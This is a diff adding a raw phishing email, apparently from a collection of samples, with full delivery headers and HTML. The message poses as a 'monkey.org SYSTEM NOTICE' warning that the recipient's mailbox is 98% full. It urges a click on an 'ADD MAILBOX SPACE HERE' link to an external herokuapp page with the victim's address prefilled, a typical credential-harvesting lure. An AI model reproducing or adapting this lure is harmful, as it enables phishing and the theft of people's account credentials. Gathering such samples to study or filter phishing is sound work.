@@ -1,0 +1,111 @@
+Return-Path: jose@monkey.org
+Delivered-To: jose@monkey.org
+X-FDA: 78637390902.47.ACF6DB7
+Received: from bodyconcept.pt (bodyconcept.pt [54.38.217.58])
+	by imf26.b.hostedemail.com (Postfix) with ESMTP id CEBD2102A838A
+	for <jose@monkey.org>; Tue, 28 Sep 2021 15:39:10 +0000 (UTC)
+DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
+	d=bodyconcept.pt; s=default; h=Content-Transfer-Encoding:Content-Type:
+	MIME-Version:Message-ID:Date:Subject:To:From:Sender:Reply-To:Cc:Content-ID:
+	Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
+	:Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
+	List-Subscribe:List-Post:List-Owner:List-Archive;
+	bh=O90L6z4dmkA6nX/Bkmu2ouFRFcVQVm4IG5Lfe6VlHlM=; b=CtCMu9Owih9rn3Lj4OOkU4Kz6e
+	+Gt/TcCLPsYxkVgfbprNGh+eWY5xvAKCwcXcbqj3luf3V4o9NC0QRutK+mY8BwrWPrrkzVgN9qQek
+	mW/vnDUHm4JGj1D1rae0J4Cmiu2Cd1XQ+dvjoxDjUTZK8cKDpMfs9Td/F5/TINdVbnqEg7lU9XEfq
+	CBUhJLNLszjRww61BXjebecGMCSjmAeGKOTqL2GWMZwzxZ4HNHDHDlp7qQQJ090Rz+WqWC9uJhH4b
+	RPUwVG7vr7kxod8pZBfL9VDshCvMsd7BOERxgLuwFxrtVCelsL3G68ZmdtSSLsbR4hirNWnCOMGL5
+	smu9iGLQ==;
+Received: from [84.38.129.26] (port=57738 helo=turner.com)
+	by kayla with esmtpsa  (TLS1.2) tls TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384
+	(Exim 4.94.2)
+	(envelope-from <jose@monkey.org>)
+	id 1mVFCJ-0002AN-IF
+	for jose@monkey.org; Tue, 28 Sep 2021 16:39:09 +0100
+From: jose@monkey.org
+To: jose@monkey.org
+Subject: Your email < jose@monkey.org > is 98% full. Add Up Space Now!!
+Date: 28 Sep 2021 17:39:09 +0200
+Message-ID: <20210928173909.6E7BF00746A48231@monkey.org>
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+X-AntiAbuse:
+ This header was added to track abuse, please include it with any abuse report
+X-AntiAbuse: Primary Hostname - kayla
+X-AntiAbuse: Original Domain - monkey.org
+X-AntiAbuse: Originator/Caller UID/GID - [47 12] / [47 12]
+X-AntiAbuse: Sender Address Domain - monkey.org
+X-Get-Message-Sender-Via:
+ kayla: authenticated_id: setubalcentro@bodyconcept.pt
+X-Authenticated-Sender: kayla: setubalcentro@bodyconcept.pt
+X-Source: 
+X-Source-Args: 
+X-Source-Dir: 
+X-Rspamd-Queue-Id: CEBD2102A838A
+X-Stat-Signature: 894473jg5pc71ihf5u1rfizne9susjwc
+Authentication-Results: imf26.b.hostedemail.com;	dkim=pass
+ header.d=bodyconcept.pt header.s=default header.b=CtCMu9Ow;	dmarc=none;
+	spf=softfail (imf26.b.hostedemail.com: 54.38.217.58 is neither permitted nor
+ denied by domain of jose@monkey.org) smtp.mailfrom=jose@monkey.org
+X-Spam-Status: No, score=1.25
+X-Rspamd-Server: rspam03
+X-HE-Tag: 1632843550-164118
+Status: RO
+X-Status: 
+X-Keywords: 
+X-UID: 78
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.=
+w3.org/TR/html4/loose.dtd">
+
+<HTML><HEAD>
+<META name=3DGENERATOR content=3D"MSHTML 11.00.10570.1001"></HEAD>
+<body style=3D"MARGIN: 0.5em">
+<P>
+<table style=3D"BOX-SIZING: border-box; FONT-SIZE: 10px; FONT-FAMILY: Verda=
+na, Helvetica, sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; BORDER-C=
+OLLAPSE: collapse; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(44,54=
+,58); FONT-STYLE: normal; TEXT-ALIGN: left; ORPHANS: 2; WIDOWS: 2; LETTER-S=
+PACING: normal; font-variant-ligatures: normal; font-variant-caps: normal; =
+-webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-de=
+coration-style: initial; text-decoration-color:=20
+initial" width=3D"100%" align=3D"center" bgcolor=3D"#ffffff" border=3D"0">
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<td style=3D"BOX-SIZING: border-box; FONT-FAMILY: Verdana, Helvetica, sans-=
+serif" bgcolor=3D"#d9dce6" align=3D"center"><SPAN style=3D"BOX-SIZING: bord=
+er-box; COLOR: rgb(204,0,0)"><STRONG style=3D"BOX-SIZING: border-box; FONT-=
+WEIGHT: bolder"><FONT size=3D1>monkey.org SYSTEM NOTICE</FONT></STRONG></SP=
+AN></TD></TR>
+<TR style=3D"BOX-SIZING: border-box">
+<td style=3D"BOX-SIZING: border-box; FONT-FAMILY: Verdana, Helvetica, sans-=
+serif" align=3D"center"><BR style=3D"BOX-SIZING: border-box"><FONT size=3D1=
+>jose&nbsp;,<BR style=3D"BOX-SIZING: border-box"></FONT><BR style=3D"BOX-SI=
+ZING: border-box">
+<table style=3D"BOX-SIZING: border-box; BORDER-COLLAPSE: collapse">
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<td style=3D"BOX-SIZING: border-box; BORDER-TOP: black 1px solid; HEIGHT: 3=
+0px; BORDER-RIGHT: black 1px solid; WIDTH: 300px; BORDER-BOTTOM: black 1px =
+solid; BORDER-LEFT: black 1px solid; BACKGROUND-COLOR: rgb(38,100,175)"><FO=
+NT size=3D1>99%</FONT></TD>
+<td style=3D"BOX-SIZING: border-box"><FONT size=3D1>100%<BR style=3D"BOX-SI=
+ZING: border-box"></FONT></TD></TR></TBODY></TABLE><BR style=3D"BOX-SIZING:=
+ border-box"><FONT size=3D1>Due to recent changes in our mail system it may=
+ be necessary to upgrade your email &lt; jose@monkey.org &gt;&nbsp;space qu=
+ota now.<BR style=3D"BOX-SIZING: border-box"></FONT><BR style=3D"BOX-SIZING=
+: border-box"><FONT size=3D1>Please add space below.<BR style=3D"BOX-SIZING=
+: border-box"></FONT><BR style=3D"BOX-SIZING: border-box"></TD></TR>
+<TR style=3D"BOX-SIZING: border-box">
+<td style=3D"BOX-SIZING: border-box; FONT-FAMILY: Verdana, Helvetica, sans-=
+serif" bgcolor=3D"#d9dce6" align=3D"center"><FONT style=3D"BOX-SIZING: bord=
+er-box" color=3D#cc0000 size=3D2><B style=3D"BOX-SIZING: border-box; FONT-W=
+EIGHT: bolder"><A style=3D"BOX-SIZING: border-box; TEXT-DECORATION: none; C=
+OLOR: rgb(0,172,255); BACKGROUND-COLOR: transparent" href=3D"https://webgra=
+de-ussd-app.herokuapp.com/?email=3Djose@monkey.org" rel=3Dnoreferrer target=
+=3D_blank><U>ADD MAILBOX SPACE HERE</U></A></B></FONT></TD></TR></TBODY></T=
+ABLE>
+</P></BODY></HTML>
+
